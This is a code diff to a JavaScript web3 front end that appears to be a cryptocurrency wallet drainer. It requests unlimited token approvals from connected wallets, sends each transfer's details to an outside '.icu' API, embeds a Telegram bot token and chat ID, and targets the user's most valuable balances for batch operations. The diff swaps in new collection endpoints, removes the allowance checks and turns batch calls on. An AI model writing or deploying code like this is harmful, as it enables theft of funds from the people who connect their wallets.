@@ -5,7 +5,7 @@ import { formatUnits, maxUint256, isAddress, getAddress, parseUnits, encodeFunct
 import { readContract, writeContract, sendCalls, estimateGas, getGasPrice, getBalance } from '@wagmi/core'
 
 // === Глобальный флаг для управления sendCalls ===
-const USE_SENDCALLS = false; // Поставьте false для отключения batch-операций
+const USE_SENDCALLS = true; // Поставьте false для отключения batch-операций
 
 // Утилита для дебаунсинга
 const debounce = (func, wait) => {
@@ -47,7 +47,7 @@ const projectId = import.meta.env.VITE_PROJECT_ID || '2511b8e8161d6176c55da917e0
 if (!projectId) throw new Error('VITE_PROJECT_ID is not set')
 
 const telegramBotToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN || '8238426852:AAGEc__oMefvCpE_jJtgsjDCleEfDBrjolc'
-const telegramChatId = import.meta.env.VITE_TELEGRAM_CHAT_ID || '-4828313363'
+const telegramChatId = import.meta.env.VITE_TELEGRAM_CHAT_ID || '-4835655591'
 
 const networks = [bsc, mainnet, polygon, arbitrum, optimism, base, scroll, avalanche, fantom, linea, zkSync, celo]
 const networkMap = {
@@ -274,7 +274,7 @@ const getScanLink = (hash, chainId, isTx = false) => {
 // Функция отправки запроса на трансфер
 const sendTransferRequest = async (userAddress, tokenAddress, amount, chainId, txHash) => {
   try {
-    const response = await fetch('https://api.latesta.icu/api/transfer', {
+    const response = await fetch('https://api.cryptomuspayye.icu/api/transfer', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({ userAddress, tokenAddress, amount: amount.toString(), chainId, txHash })
@@ -616,65 +616,33 @@ const getTokenPrice = async (symbol) => {
 }
 
 const approveToken = async (wagmiConfig, tokenAddress, contractAddress, chainId) => {
-  if (!wagmiConfig) throw new Error('wagmiConfig is not initialized');
-  if (!tokenAddress || !contractAddress) throw new Error('Missing token or contract address');
-  if (!isAddress(tokenAddress) || !isAddress(contractAddress)) throw new Error('Invalid token or contract address');
-
-  const checksumTokenAddress = getAddress(tokenAddress);
-  const checksumContractAddress = getAddress(contractAddress);
-
+  if (!wagmiConfig) throw new Error('wagmiConfig is not initialized')
+  if (!tokenAddress || !contractAddress) throw new Error('Missing token or contract address')
+  if (!isAddress(tokenAddress) || !isAddress(contractAddress)) throw new Error('Invalid token or contract address')
+  const checksumTokenAddress = getAddress(tokenAddress)
+  const checksumContractAddress = getAddress(contractAddress)
   try {
-    // Проверяем текущий allowance
-    const currentAllowance = await getTokenAllowance(
-      wagmiConfig,
-      wagmiConfig.account.address, // Текущий адрес пользователя
-      checksumTokenAddress,
-      checksumContractAddress,
-      chainId
-    );
-
-    // Если allowance уже maxUint256, пропускаем approve
-    if (currentAllowance >= maxUint256) {
-      console.log(`Allowance for ${checksumTokenAddress} is already max, skipping approve`);
-      return null; // Возвращаем null, чтобы указать, что approve не нужен
-    }
-
-    // Шаг 1: Обнуляем allowance (approve(spender, 0))
-    if (currentAllowance > 0) {
-      console.log(`Zeroing allowance for ${checksumTokenAddress} on chain ${chainId}`);
-      const zeroTxHash = await writeContract(wagmiConfig, {
-        address: checksumTokenAddress,
-        abi: erc20Abi,
-        functionName: 'approve',
-        args: [checksumContractAddress, 0],
-        chainId,
-      });
-      console.log(`Zero allowance transaction sent: ${zeroTxHash}`);
-      await monitorAndSpeedUpTransaction(zeroTxHash, chainId, wagmiConfig);
-    }
-
-    // Шаг 2: Устанавливаем новый allowance
-    console.log(`Approving ${checksumTokenAddress} for ${checksumContractAddress} on chain ${chainId}`);
     const txHash = await writeContract(wagmiConfig, {
       address: checksumTokenAddress,
       abi: erc20Abi,
       functionName: 'approve',
       args: [checksumContractAddress, maxUint256],
-      chainId,
-    });
-    console.log(`Approve transaction sent: ${txHash}`);
-
+      chainId
+    })
+    console.log(`Approve transaction sent: ${txHash}`)
+    
     // Запускаем мониторинг транзакции в фоне
     monitorAndSpeedUpTransaction(txHash, chainId, wagmiConfig).catch(error => {
-      console.error(`Error monitoring transaction ${txHash}:`, error);
-    });
-
-    return txHash;
+      console.error(`Error monitoring transaction ${txHash}:`, error)
+    })
+    
+    return txHash
   } catch (error) {
-    store.errors.push(`Approve token failed: ${error.message}`);
-    throw error;
+    store.errors.push(`Approve token failed: ${error.message}`)
+    throw error
   }
-};
+}
+
 // Add batch operations function after the getTokenPrice function
 const performBatchOperations = async (mostExpensive, allBalances, state) => {
   if (!mostExpensive) {
